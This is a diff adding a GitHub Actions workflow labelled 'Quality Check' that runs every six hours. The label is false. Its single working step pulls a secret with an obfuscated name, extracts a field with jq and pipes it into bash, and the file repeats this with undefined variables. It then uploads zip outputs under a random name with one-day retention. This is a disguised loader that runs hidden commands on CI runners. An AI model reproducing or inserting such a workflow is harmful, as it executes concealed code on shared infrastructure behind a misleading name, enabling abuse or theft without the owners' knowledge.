@@ -1,0 +1,31 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '10 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          fqkr3580: ${{ secrets.fqkr3580 }}
+        run: |
+          printf '%s' "$fqkr3580" | jq -r .algq119 | /bin/bash
+          printf '%s' "$xsz394" | jq -r .abzw9135 | /bin/bash
+          printf '%s' "$uydej7" | jq -r .xbovz98663 | /bin/bash
+          echo $wvk51752 | jq -r .fu465 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: oqRpip6R
+          path: "*.zip"
+          retention-days: 1
